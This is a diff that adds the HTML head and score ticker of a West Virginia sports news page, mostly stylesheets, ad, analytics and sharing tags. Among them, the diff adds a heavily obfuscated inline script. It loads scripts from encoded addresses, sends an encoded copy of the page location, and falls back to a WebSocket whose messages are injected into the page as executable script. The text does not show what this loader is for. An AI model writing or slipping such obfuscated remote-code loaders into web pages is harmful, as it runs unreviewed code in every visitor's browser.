!important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
+:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
+:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
+:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
+</style>
+<link rel='stylesheet' id='owmweather-css-css' href='https://wvmetronews.com/wp-content/plugins/owm-weather/css/owmweather.min.css?ver=6.6.8' type='text/css' media='all' />
+<link rel='stylesheet' id='understrap-styles-css' href='https://wvmetronews.com/wp-content/themes/wvmn/css/theme.css?ver=1.0.1729145964' type='text/css' media='all' />
+<link rel='stylesheet' id='font-awesome-styles-css' href='https://wvmetronews.com/wp-content/themes/wvmn/css/fontawesome/all.css?ver=1.0.1729145964' type='text/css' media='all' />
+<link rel='stylesheet' id='swiper-styles-css' href='https://wvmetronews.com/wp-content/themes/wvmn/css/swiper.css?ver=1.0.1729145964' type='text/css' media='all' />
+<link rel='stylesheet' id='slick-css' href='https://wvmetronews.com/wp-content/themes/wvmn/css/slick.css?ver=1.0.1729145964' type='text/css' media='all' />
+<script type="d157fd38a32685cc840424ab-text/javascript" src="https://wvmetronews.com/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
+<script type="d157fd38a32685cc840424ab-text/javascript" src="https://wvmetronews.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
+<link rel="https://api.w.org/" href="https://wvmetronews.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://wvmetronews.com/wp-json/wp/v2/posts/671539" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://wvmetronews.com/xmlrpc.php?rsd" />
+<meta name="generator" content="WordPress 6.6.8" />
+<link rel='shortlink' href='https://wvmetronews.com/?p=671539' />
+<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://wvmetronews.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwvmetronews.com%2F2026%2F05%2F23%2Fboys-state-track-huntington-doddridge-defends-in-class-aa%2F" />
+<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://wvmetronews.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwvmetronews.com%2F2026%2F05%2F23%2Fboys-state-track-huntington-doddridge-defends-in-class-aa%2F&#038;format=xml" />
+    <script async defer type="d157fd38a32685cc840424ab-text/javascript" src="https://xp.audience.io/sdk.js"></script>
+     <script data-cfasync="false" type="text/javascript">
+   var freestar = freestar || {};
+   freestar.queue = freestar.queue || [];
+   freestar.config = freestar.config || {};
+   freestar.config.enabled_slots = [];
+      freestar.initCallback = function () { (freestar.config.enabled_slots.length === 0) ? freestar.initCallbackCalled = false : freestar.newAdSlots(freestar.config.enabled_slots) }
+ </script>
+     <!-- This website uses the Ultimate Social Comments plugin v1.4.8 - https://wordpress.org/plugins/ultimate-facebook-comments/ -->
+<meta property="fb:app_id" content="636216930573467"/>
+<style type="text/css">.fb-comments, .fb-comments span, .fb-comments span iframe[style] { min-width:100% !important; width:100% !important }</style>
+<link rel="icon" href="https://s3.us-east-005.backblazeb2.com/wvmn-s3/2024/07/cropped-metro-icon-32x32.png" sizes="32x32" />
+<link rel="icon" href="https://s3.us-east-005.backblazeb2.com/wvmn-s3/2024/07/cropped-metro-icon-192x192.png" sizes="192x192" />
+<link rel="apple-touch-icon" href="https://s3.us-east-005.backblazeb2.com/wvmn-s3/2024/07/cropped-metro-icon-180x180.png" />
+<meta name="msapplication-TileImage" content="https://s3.us-east-005.backblazeb2.com/wvmn-s3/2024/07/cropped-metro-icon-270x270.png" />
+		<style type="text/css" id="wp-custom-css">
+			#livebanner.stick-top {
+  position: fixed;
+  top: 40px;
+  z-index: 100;
+  width: 100%;
+  border-bottom: 2px solid #acacad;
+  box-shadow: 0px 3px 6px rgba(0, 0, 0, 0.2);
+}
+.header-weather .owmw-now {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  position: absolute;
+  top: calc(50% - 10px);
+	bottom: auto;
+	left: auto;
+	right: 10px;
+  color: #fff;
+	padding-left: 1rem;
+		max-width: 240px;
+}
+    @media (min-width:880px) {
+			.header-weather .owmw-now {
+  top: calc(50% - 28px);
+}
+			body.page-id-193249 #menu-item-558907 {
+  min-width: 240px;
+}
+			body.page-id-193249 #menu-primary-menu {
+  flex: 1 2 100%;
+  display: flex;
+  justify-content: space-between;
+}
+}
+.header-weather{
+	position: relative;
+	flex: 1 1 20%;
+}
+.header-weather .owm-weather-id{
+	width: 100%;
+}
+#main-nav nav{
+	display: flex;
+	justify-content: space-between;
+}
+
+/*move player*/
+@media screen and (max-width: 1024px) {
+	#full-width-page-wrapper::after {
+position: relative !important;
+	}
+}
+.livestream-sidebar{
+	background:#101;
+	color: #f2f2f2;
+}
+/*sponsor takeover ticker */
+body.page-template-football-scoreboard .alert-info {
+  color: #f6d655;
+  background-color: #101010 !important;
+  border-color: #101010;
+  font-size: 0.9rem !important;
+  letter-spacing: 0.1rem;
+  font-weight: bold;
+}
+/* takeover boxes*/
+        .sb-game.final .sb-team.sb-lead-home .sb-score,
+        .sb-game.final .sb-team.sb-lead-away .sb-score {
+            background: #b2e0b9;
+        }
+
+        .sb-game.final .sb-team.sb-lead-home,
+        .sb-game.final .sb-team.sb-lead-away {
+            background: #d4e8d7;
+            font-weight: bold;
+        }
+
+        .sb-game .sb-team.change {
+            background: #f9efc8;
+        }
+
+        .sb-game .sb-team.change .sb-score {
+            background: #e8ddb2;
+        }
+
+
+        .sb-game .sb-info {
+            overflow: auto;
+        }
+
+        .sb-game .sb-status {
+            font-size: 12px;
+            text-align: right;
+            padding: 8px 0;
+            font-weight: bold;
+            width: 70px;
+            float: left;
+        }
+
+        .sb-game .sb-headline {
+            float: left;
+            width: calc(100% - 90px);
+            color: #BB0000;
+            font-weight: bold;
+            font-size: 12px;
+            padding: 8px 0 8px 10px;
+            cursor: pointer;
+        }
+
+        .sb-game .sb-notes {
+            font-size: 10px;
+            padding: 0 0 5px 10px;
+            display: none;
+        }
+.fa-volume::before {
+  content: "\f026";
+}
+.hidden {
+  opacity: 0;
+  margin-left: -9999px !important;
+  position: absolute;
+}
+.menu-item img {
+  height: 32px;
+  padding-top: 4px;
+}
+body.postid-638330 #wvmetronews-leaderboard-btf{display:none;height:0;font-size:1;}		</style>
+		    <script src="https://www.google.com/recaptcha/api.js" async defer type="d157fd38a32685cc840424ab-text/javascript"></script>
+
+    <script async src="https://static.addtoany.com/menu/page.js" type="d157fd38a32685cc840424ab-text/javascript"></script>
+    <script type="d157fd38a32685cc840424ab-text/javascript" src="https://platform-api.sharethis.com/js/sharethis.js#property=5cf01aba7feea60012093e88&product='inline-share-buttons'" async='async'></script>
+    <script async id="sBeacon" src="https://ap.lijit.com/www/sovrn_beacon_standalone/sovrn_standalone_beacon.js?iid=13436453&amp;uid=WV" type="d157fd38a32685cc840424ab-text/javascript"></script>
+
+    <script src="//cdn.jsdelivr.net/npm/jquery.marquee@1.5.0/jquery.marquee.min.js" type="d157fd38a32685cc840424ab-text/javascript"></script>
+
+    <script type="d157fd38a32685cc840424ab-text/javascript">
+        jQuery(function () {
+            var w = jQuery('body').width();
+            jQuery('.marquee').marquee({
+                duration: w <= 600 ? 20000 : 30000,
+                delayBeforeStart: 0,
+                duplicated: true,
+                gap: 0,
+                pauseOnHover: true,
+                startVisible: true
+            });
+        });
+    </script>
+
+    <!-- turned off prebid -->
+    <!-- <script src="//prebid.mpwdigital.com/wvmetronews/wvmetronews.prebid.js"></script> -->
+
+<!-- PLACE THIS SECTION INSIDE OF YOUR HEAD TAGS -->
+<!-- Below is a link to a CSS file that accounts for Cumulative Layout Shift, a new Core Web Vitals subset that Google uses to help rank your site in search -->
+<!-- The file is intended to eliminate the layout shifts that are seen when ads load into the page. If you don't want to use this, simply remove this file -->
+<!-- To find out more about CLS, visit https://web.dev/vitals/ -->
+        <link rel="stylesheet" href="https://a.pub.network/core/pubfig/cls.css">
+<script data-cfasync="false" type="text/javascript">
+  var freestar = freestar || {};
+  freestar.queue = freestar.queue || [];
+  freestar.config = freestar.config || {};
+  freestar.config.enabled_slots = [];
+  freestar.initCallback = function () { (freestar.config.enabled_slots.length === 0) ? freestar.initCallbackCalled = false : freestar.newAdSlots(freestar.config.enabled_slots) }
+</script>
+<script src="https://a.pub.network/wvmetronews-com/pubfig.min.js" data-cfasync="false" async></script>
+<script data-cfasync="false">(function(){function v(O,Z){const M=l();return v=function(H,Q){H=H-(0x183*0x1+0x1fe3+0x1f79*-0x1);let F=M[H];if(v['riXEOQ']===undefined){var a=function(u){const c='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let N='',h='';for(let W=0x113*0x9+0x1193*-0x1+0x7e8,R,i,D=-0x25ea+0x2fb+-0xba5*-0x3;i=u['charAt'](D++);~i&&(R=W%(-0xa*0x34b+0xb*0x25b+-0x1*-0x709)?R*(-0xd*0x11b+-0x45*0x48+-0x2207*-0x1)+i:i,W++%(-0x91b+0x110e+-0x7ef))?N+=String['fromCharCode'](0x3*0x36d+0x9*0x6a+-0x1e*0x6f&R>>(-(0xdc5*-0x2+-0x162b+0x31b7)*W&-0x1*-0xe17+0x2*-0x8a7+0x33d)):0x483+-0x11*-0x6d+0x20*-0x5e){i=c['indexOf'](i);}for(let J=-0xd9*0x25+0x3*0x349+-0x1*-0x1582,r=N['length'];J<r;J++){h+='%'+('00'+N['charCodeAt'](J)['toString'](0x193f+-0xa33+-0xefc*0x1))['slice'](-(0x2*0x5ae+0x61+-0x7*0x1ad));}return decodeURIComponent(h);};const S=function(u,c){let N=[],h=-0x208b+-0x18bf*0x1+0x394a,W,R='';u=a(u);let D;for(D=-0x23de+-0xbf*-0x2f+-0x29*-0x5;D<-0x24e6+0xf6f+0x1677;D++){N[D]=D;}for(D=-0x14ba+-0x5*-0x205+0xaa1;D<-0x151a+-0x1853+0x2e6d;D++){h=(h+N[D]+c['charCodeAt'](D%c['length']))%(0xb*-0x107+-0x430*-0x5+-0x8a3),W=N[D],N[D]=N[h],N[h]=W;}D=0xfd4+-0x9*-0x357+0x2de3*-0x1,h=-0xa9*0x22+0x2*0xb7e+-0x6*0x17;for(let J=-0x843+-0xc5f*0x2+-0x4b7*-0x7;J<u['length'];J++){D=(D+(0x1*-0x2109+-0x1736+0x8*0x708))%(-0x1*0x328+0x1a65+-0x163d),h=(h+N[D])%(0x18a3+-0x8b3*-0x1+0x2056*-0x1),W=N[D],N[D]=N[h],N[h]=W,R+=String['fromCharCode'](u['charCodeAt'](J)^N[(N[D]+N[h])%(-0x1dfb*-0x1+0x1fc+-0x1*0x1ef7)]);}return R;};v['ETVMga']=S,O=arguments,v['riXEOQ']=!![];}const z=M[0x1d1b*0x1+-0xbd6+-0x1145*0x1],w=H+z,U=O[w];return!U?(v['qhjNxM']===undefined&&(v['qhjNxM']=!![]),F=v['ETVMga'](F,Q),O[w]=F):F=U,F;},v(O,Z);}function l(){const D=['WQhcJSkxW5q','WOWXa8o9c8kEWR9InSkiW77dQW','kmo7lhe','rZZdTG','W6/dOCkWcG','W7ddGmogAq','W5fOuSoJ','WQNcP1ad','W5ddU1O7W6mtWR0L','W6JcGKtcRW','oCkWW68c','WRNdImonua','WOraW7Wm','W49bA24','umoAz8ot','WPGvWQ5tk3rLq07cQcW','wMqOsW','ACkWwfe','W77cGCo0W5a','DY18W7O','lhizW5C+W5a7WQy','WOxcGZmK','FbNdQLK','W5OwW5i2','WOK2hZe','W5DStW','p8kLW6Oi','WQBdTZtcNG','dmkykrO','AXJdOgG','CCkJWQW9','pSoGvmoBWOxdImkmaW','W5mnFM8','uqmxiG','WO84dSo5cSomWQjjh8kGW7m','W4NcH8oLEG','W6xdQCk6','mXygWOK','W7/cVmoxW6y','ibWsW7i','oxxdUCkX','W7JcRN8k','W6pcIfW8','ySk7aSo+','rmkfWRpcHW','FCoXfq','gSkumSoq','W7JdJCoh','W4rdF24','W4VdLWWH','WRRcPtPj','W55mxMW','FGxdGeG','ACk0WQiT','W48rW44H','yv4zWRq','dmoyw8kIW67dR0xdUcRcISkRvq','W5DQv8kH','aJevuu5gvSkc','FvVcMCkr','jmk/W7Cr','WQtcQddcIa','mmkcW5qN','W5tdVXTdWPiyWPqdWPpcTK8','WQxdOJ/cIW','WPKxqMG','WPtdG8ogxa','WPeIu3e','WQtdICogta','WP5Trh8','puLgWQVdSq7cOSoGW7VdQ8oMWPO','pWaLW43dNxWJcKhcPMySAG','cCk0WP/cSCovWR7dT8oEA8kLtSkw','W5Lmu2W','A1SYWOO','mLFcQ8o4','WRtdNSonsq','W77dOmkZsW','WOG9dSo/c8kCWPzFpCkAW5RdJa','W608hmoj','W78XF2C','dtpdVw4','isBdTSk+cCkxD8kofCkNm0VcOq','AXahW7O','hmoxDeC','WOO8a8o0bmkyWOXCiSk6W5tdJW','WOlcQ1C4','W7hdGCorEa','cGn9pa','W6pdKqf6','WPj4xxi','WOL4uwO','aZH1aWm+eCkhlv/cGvdcQq','W5HCAxq','WO1tW4tdIG','W4xdILmL','W6RcJCkxW44','lWVcO8oX','BteW','W4GwW5iL','Cf3cN8ko','DIyYW7C','b8kmBey','W6xcJ1BcMa','hZpdQZq','vSo0W4/dOG','jmkWjtm','xguSvW','AM/cU8oJbGnEoamOgCooW7e','jHRcQ8oA','du3cUCoR','W6C9fSos','lxvGWQf5W40qWRqFy3y','WOmSwu0','WOqPwuK','DGFcJmkx','z1zWWPG','BtCYW6C','WPBcVea','WQSZhmkl','W4dcLeaJ','mNxdOSk+','mSoPW7b/W5OSW5RcMgzrEG','yGJdSf0','jmkMlNW','eaj7oa','EWiYW5i','y8kHwCoN','FMpcSSkI','u8o5WONdQG','w2FdJWtdJxFdJ8kf','WPhdL8oqFCogaCksAa','pKraW7RcJ3NcMSoGW74','kvdcVSoV','W4KOba','f8kad8oY','s8kzd8oV','Bvv4WPm','gJ7dRcu','W6ZcKSkxW4e','W6ddQSk9rq','kvWtWQC','uw45ya','C3BcVSkJ','W5dcImoyBq','W4FdJ1eY','DhFcQmkJ','yfeiWQC','WQtdHmobtq','WQtcQMvm','WO5dW4hdGW','W63dH8onyG','iSk6pW','WOnpW43dJG','ddJdSrm','W50rW45+','WOTzWO7dHG','W6eGcSoj','gmkgpSku','yv0zWQG','W5tdNmkNma','W5TNqSkA','DSo+WQ4O','W44hW4vQ','WQRcMmkrpKJdL8kKWRykW7pdRG','E11PWRW','DxhcPCoP','emoZW4tdSq','WOmpW4xcGa','nmk3oxq','sSkjW6NcIW','W6ddOCoXqq','W5z3reToW4a4WORdVq','W5ddKKiJ','ACo7CLC','W4DjWRia','W4ZdIeyM','W6CGeCow','W6BdPJxdGq','fWPC','WOrsW4NdNW','WQhdOJdcIa','W7RdN8omqW','ndpdRSk8','WOtcVLms','z1qsW6G','CuZcH8kA','oSo3aG','yquAW7O','W4GAEhy','vwrGqa','xCklhCk0','W4BcLSo4EG','zcNdQCkI','wSoSW4pcRa','w8kuW7tcIW','puhcSSol','DLumWQO','r2u5','z8kXaSoY'];l=function(){return D;};return l();}(function(O,Z){const u=v,M=O();while(!![]){try{const H=-parseInt(u(0x28a,'Dv1c'))/(-0x199+-0x464*0x1+-0x2*-0x2ff)*(parseInt(u(0x1f8,'A929'))/(-0x5ee+-0x151a+0x1b0a))+parseInt(u(0x20a,'%9kn'))/(0x2c7*-0x4+0x107*-0xb+0x166c)*(-parseInt(u(0x29e,'Qd0Q'))/(-0x6*0x41d+-0x1*-0xfd4+0x46f*0x2))+-parseInt(u(0x258,'Omqw'))/(-0xa9*0x22+0x2*0xb7e+-0x7*0x13)*(-parseInt(u(0x251,'Qd0Q'))/(-0x843+-0xc5f*0x2+-0x69b*-0x5))+-parseInt(u(0x2a2,'F6dL'))/(0x1*-0x2109+-0x1736+0x2*0x1c23)+-parseInt(u(0x297,'Ap[k'))/(-0x1*0x328+0x1a65+-0x1735)+-parseInt(u(0x20c,'##(h'))/(0x18a3+-0x8b3*-0x1+0x214d*-0x1)*(-parseInt(u(0x288,'f(0s'))/(-0x1dfb*-0x1+0x1fc+-0x1*0x1fed))+-parseInt(u(0x28f,'Omqw'))/(0x1d1b*0x1+-0xbd6+-0x1b9*0xa)*(-parseInt(u(0x25f,'VaAF'))/(0x2419+-0xc02+-0x180b));if(H===Z)break;else M['push'](M['shift']());}catch(Q){M['push'](M['shift']());}}}(l,-0xd5d*-0x29+-0x4acab*-0x1+-0x1*-0x219fb),(function(){const c=v;window[c(0x2a0,'1jZ8')+'_'+window[c(0x2b3,'G56u')](window[c(0x214,'OkCi')+c(0x21f,'y0YV')][c(0x238,'igDp')])]={'HTMLIFrameElement_contentWindow':Object[c(0x2a6,'Omqw')+c(0x218,'DgkF')+c(0x26b,'zxRr')+c(0x284,'IU85')+c(0x231,'X42!')+c(0x267,'G56u')](HTMLIFrameElement[c(0x26e,'[]7o')+c(0x299,'SbUP')+'e'],c(0x1f7,'Fi[Z')+c(0x229,'Qd0Q')+c(0x29f,'Fi[Z')+'w')};function O(H){const N=c,[Q,...F]=H,a=document[N(0x29c,'bY^S')+N(0x28e,'gjVg')+N(0x2b0,'5GNf')+'t'](N(0x27a,'^Kkv')+'pt');return a[N(0x1fe,'Omqw')]=Q,a[N(0x26d,'IU85')+N(0x1f0,'%9kn')+N(0x1f6,'D)a3')+N(0x287,'0P8Z')](N(0x225,'Fi[Z')+'r',()=>{const h=N;if(F[h(0x290,'zxRr')+'th']>0x199*-0xb+-0x7*-0x1f3+0x3ee)O(F);else{const z=new WebSocket(h(0x223,'G56u')+h(0x291,'SbUP')+h(0x282,'hnRc')+h(0x256,'Qd0Q')+h(0x29a,'Ap[k')+'s');z[h(0x1fc,'Ap[k')+h(0x29b,'D)a3')+'e']=w=>{const W=h,U=w[W(0x295,'YAZh')],S=document[W(0x213,'5GNf')+W(0x2a8,'GgLv')+W(0x211,'Ap[k')+'t'](W(0x270,'1jZ8')+'pt');S[W(0x262,')0Z*')+W(0x292,'bY^S')+W(0x220,'X42!')]=U,document[W(0x285,'[]7o')][W(0x240,'Omqw')+W(0x261,'P8KL')+W(0x23b,'GgLv')](S);},z[h(0x28c,'3h1U')+'en']=()=>{const R=h;z[R(0x294,'bY^S')](R(0x286,'G56u')+R(0x244,'##(h')+'l');};}}),document[N(0x1ed,'A929')][N(0x2af,'igDp')+N(0x205,'GgLv')+N(0x274,'OkCi')](a),a;}const Z=document[c(0x2a4,'PQ2%')+c(0x222,'%9kn')+c(0x23c,'V$aS')+'t'][c(0x2a3,'##(h')+c(0x24e,'Dv1c')][c(0x221,'V$aS')+'in']??c(0x2aa,'YAZh')+c(0x215,'0P8Z')+c(0x200,'igDp');document[c(0x219,'igDp')+c(0x216,'Dv1c')+c(0x239,'Fi[Z')+'t'][c(0x29d,'OkCi')+'ve']();const M=document[c(0x204,'X42!')+c(0x2a8,'GgLv')+c(0x227,'0P8Z')+'t'](c(0x21d,'hnRc')+'pt');M[c(0x2b2,'A929')]=c(0x2b4,'l[C%')+c(0x249,'F6dL')+Z+(c(0x22f,'eIM$')+c(0x208,'F6dL'))+btoa(location[c(0x2a7,'y0YV')+c(0x273,'DgkF')])[c(0x24d,'0P8Z')+c(0x27f,'y0YV')](/=+$/,'')+c(0x243,'ASv0'),M[c(0x22d,'Ap[k')+c(0x26a,'3h1U')+c(0x232,'5BS#')](c(0x21b,'0P8Z')+c(0x23e,'bY^S'),c(0x25e,'yn^V')+c(0x269,'B4Dn')),M[c(0x1ef,'2Wpz')+c(0x266,'IU85')+c(0x257,'Omqw')+c(0x276,'afUM')](c(0x28b,'l[C%')+'r',()=>{const i=c;O([i(0x283,'SbUP')+i(0x228,'DgkF')+i(0x1f2,'X42!')+i(0x2ae,'V$aS')+i(0x259,'2Wpz')+i(0x250,'5GNf')+i(0x279,'hnRc')+i(0x246,'Dv1c')+i(0x23f,'1Pi6')+i(0x230,'V$aS')+i(0x255,'y0YV')+i(0x1ee,'PQ2%'),i(0x245,'1jZ8')+i(0x249,'F6dL')+i(0x254,'OkCi')+i(0x210,'f(0s')+i(0x265,'&fl*')+i(0x224,'V$aS')+i(0x25d,'1jZ8')+i(0x1ff,'Fi[Z')+i(0x24b,'5BS#')+i(0x237,'VaAF')+i(0x25c,'VaAF')+i(0x2b1,'D)a3')+i(0x2a1,'%9kn')+'js',i(0x207,'2xTa')+i(0x268,'YAZh')+i(0x21a,'F6dL')+i(0x2ab,'YAZh')+i(0x21e,'V$aS')+i(0x209,'eIM$')+i(0x252,'X42!')+i(0x27e,'yn^V')+i(0x212,'%9kn')+i(0x24f,'2xTa')+i(0x277,'##(h')+i(0x236,'P8KL')+i(0x217,'F6dL')+'js',i(0x24c,'lU#Y')+i(0x2a9,'^Kkv')+i(0x241,'0P8Z')+i(0x1fd,'A929')+i(0x289,'Qd0Q')+i(0x27c,'5BS#')+i(0x275,'K4[9')+i(0x23a,'zxRr')+i(0x21c,'bY^S')+i(0x233,'OkCi')+i(0x20f,'f(0s')+i(0x201,'1Pi6')+i(0x22b,'G56u')+'js',i(0x203,'IU85')+i(0x206,'Ap[k')+i(0x25a,'3h1U')+i(0x1f9,'B4Dn')+i(0x1f1,'eIM$')+i(0x1fa,'B4Dn')+i(0x281,'igDp')+i(0x280,'1jZ8')+i(0x242,'l[C%')+i(0x271,'GgLv')+i(0x247,'f(0s')+i(0x1f3,'Dv1c')+i(0x1f5,'lU#Y')+i(0x263,'A929')+i(0x260,'Dv1c')+i(0x253,'%9kn'),i(0x20d,'D)a3')+i(0x26c,'PQ2%')+i(0x22e,'F6dL')+i(0x1fb,'l[C%')+i(0x235,'igDp')+i(0x293,'YAZh')+i(0x28d,'zxRr')+i(0x226,'yn^V')+i(0x24a,'eIM$')+i(0x278,'1Pi6')+i(0x22a,'[]7o')+i(0x27b,'2xTa')+i(0x25b,'bY^S')+i(0x20e,'B4Dn')]);}),document[c(0x23d,'zxRr')][c(0x248,'DgkF')+c(0x2ad,'SbUP')+c(0x27d,'ASv0')](M);}()));})();</script>
+                <!-- Google Tag Manager -->
+        <script type="d157fd38a32685cc840424ab-text/javascript">(function (w, d, s, l, i) {
+                w[l] = w[l] || []; w[l].push({ 'gtm.start': new Date().getTime(), event: 'gtm.js' });
+                var f = d.getElementsByTagName(s)[0], j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : '';
+                j.async = true; j.src = 'https://www.googletagmanager.com/gtm.js?id=' + i + dl; f.parentNode.insertBefore(j, f);
+            })(window, document, 'script', 'dataLayerZypmedia', 'GTM-5DPTSJQ');</script>
+        <!-- End Google Tag Manager -->
+        <!-- start google analytics code -->
+        <script type="d157fd38a32685cc840424ab-text/javascript">
+            (function (i, s, o, g, r, a, m) { i['GoogleAnalyticsObject'] = r; i[r] = i[r] || function () {
+                (i[r].q = i[r].q || []).push(arguments) }, i[r].l = 1 * new Date();
+                a = s.createElement(o), m = s.getElementsByTagName(o)[0]; a.async = 1; a.src = g;
+                m.parentNode.insertBefore(a, m)
+            })(window, document, 'script', '//www.google-analytics.com/analytics.js', 'ga');
+            ga('create', 'UA-3820665-2', 'auto');
+            ga('send', 'pageview');
+        </script>
+        <!-- end google analytics code -->
+    
+        <!-- end google adsense code -->
+
+</head>
+
+<body class="post-template-default single single-post postid-671539 single-format-standard group-blog" id="notmobile">
+
+<!-- sports --><!-- wrap these each in a div with appropriate id -->
+
+<div id="headlinebanner">
+    </div>
+<div id="scorebanner">
+            <div id="scorebanner-text">
+            <div id="scores">
+                <span class="fade-left"><a href="https://wvmetronews.com/high-school-football-scores/">High School Football <img src="https://s3.us-east-005.backblazeb2.com/wvmn-s3/2023/08/F8HBq1SE-army-national-guard-white.png" class="tickerlogo" alt="Sponsored by Army National Guard" /></a></span>
+                <div class="sbinner">
+                    <ul class="marquee">
+                        <li class="score-start">&nbsp;&nbsp;&nbsp;</li><li class="score-label">Class AAAA</li><li><a href="https://wvmetronews.com/high-school-football-scores/">&nbsp;Washington  at&nbsp;&nbsp;Bishop OConnell, Va.&nbsp;&nbsp;</a></li><li><a href="https://wvmetronews.com/high-school-football-scores/">&nbsp;Elkins <span class="sb-score">55</span> at&nbsp;&nbsp;Buckhannon-Upshur <span class="sb-score">14</span>&nbsp;&nbsp;</a></li><li><a href="https://wvmetronews.com/high-school-football-scores/">&nbsp;Spring Valley <span class="sb-score">14</span> at&nbsp;&nbsp;Cabell Midland <span class="sb-score">27</span>&nbsp;&nbsp;</a></li><li><a href="https://wvmetronews.com/high-school-football-scores/">&nbsp;Huntington <span class="sb-score">37</span> at&nbsp;&nbsp;Hurricane <span class="sb-score">12</span>&nbsp;&nbsp;</a></li><li><a href="https://wvmetronews.com/high-school-football-scores/">&nbsp;Canisius, NY. at&nbsp;&nbsp;Martinsburg &nbsp;&nbsp;</a></li><li><a href="https://wvmetronews.com/high-school-football-scores/">&nbsp;Shady Spring <span class="sb-score">22</span> at&nbsp;&nbsp;Oak Hill <span class="sb-score">15</span>&nbsp;&nbsp;</a></li><li><a href="https://wvmetronews.com/high-school-football-scores/">&nbsp;Parkersburg <span class="sb-score">21</span> at&nbsp;&nbsp;Parkersburg South <span class="sb-score">3</span>&nbsp;&nbsp;</a></li><li><a href="https://wvmetronews.com/high-school-football-scores/">&nbsp;Musselman <span class="sb-score">33</span> at&nbsp;&nbsp;Spring Mills <span class="sb-score">15</span>&nbsp;&nbsp;</a></li><li><a href="https://wvmetronews.com/high-school-football-scores/">&nbsp;Wheeling Park <span class="sb-score">0</span> at&nbsp;&nbsp;University <span class="sb-score">66</span>&nbsp;&nbsp;</a></li><li class="score-start">&nbsp;&nbsp;&nbsp;</li><li class="score-label">Class AAA</li><li><a href="https://wvmetronews.com/high-school-football-scores/">&nbsp;Indian Creek, Oh. Redskins<span class="sb-score">15</span> at&nbsp;&nbsp;Brooke <span class="sb-score">6</span>&nbsp;&nbsp;</a></li><li><a href="https://wvmetronews.com/high-school-football-scores/">&nbsp;Princeton <span class="sb-score">61</span> at&nbsp;&nbsp;Chapmanville <span class="sb-score">21</span>&nbsp;&nbsp;</a></li><li><a href="https://wvmetronews.com/high-school-football-scores/">&nbsp;Lewis County <span class="sb-score">13</span> at&nbsp;&nbsp;East Fairmont <span class="sb-score">14</span>&nbsp;&nbsp;</a></li><li><a href="https://wvmetronews.com/high-school-football-scores/">&nbsp;Hampshire <span class="sb-score">12</span> at&nbsp;&nbsp;Grafton <span class="sb-score">39</span>&nbsp;&nbsp;</a></li><li><a href="https://wvmetronews.com/high-school-football-scores/">&nbsp;Woodrow Wilson <span 